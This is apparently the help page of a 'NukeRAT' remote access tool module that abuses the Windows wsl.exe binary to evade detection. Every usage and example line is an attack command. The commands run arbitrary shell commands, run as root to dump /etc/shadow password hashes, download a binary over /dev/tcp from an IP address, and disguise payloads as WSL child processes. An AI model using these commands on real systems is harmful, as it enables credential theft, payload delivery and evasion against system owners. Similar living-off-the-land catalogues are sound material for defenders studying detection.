ABOUT
    Windows subsystem for Linux executable. LOLBAS covers execution of
    specified file, can be used to execute arbitrary Linux commands,
    execution of arbitrary Linux commands as root without need for
    password, execution of arbitrary Linux commands, downloading file,
    and executing a payload as a child process of `bash.exe` while
    masquerading as WSL.

USAGE:
    wsl.exe -e /mnt/c/Windows/System32/calc.exe
    wsl.exe -u root -e cat /etc/shadow
    wsl.exe --exec bash -c "{CMD}"
    wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
    wsl.exe

EXAMPLES:
    wsl.exe -e /mnt/c/Windows/System32/calc.exe
    wsl.exe -u root -e cat /etc/shadow
    wsl.exe --exec bash -c "{CMD}"
    wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
    wsl.exe

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    wsl.exe -e /mnt/c/Windows/System32/calc.exe
